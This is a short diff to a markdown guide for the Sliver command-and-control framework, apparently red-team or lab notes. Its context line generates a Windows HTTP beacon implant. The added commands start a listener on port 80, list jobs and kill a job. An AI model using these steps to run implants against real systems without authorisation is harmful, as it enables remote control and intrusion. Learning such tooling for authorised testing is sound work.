@@ -113,7 +113,15 @@ sliver > generate beacon --http 127.0.0.1 --name httpbeacon443 --os windows
 
 ## Setting up a Listener
 ```bash
+# Setup a listener for beacons on port 80
 sliver > http --lport 80
+
+# List active listeners
+sliver > jobs
+
+# Kill job 2, to free up listener on that port
+sliver > kill -k 2 
+
 ```
 
 ## Using the Beacon
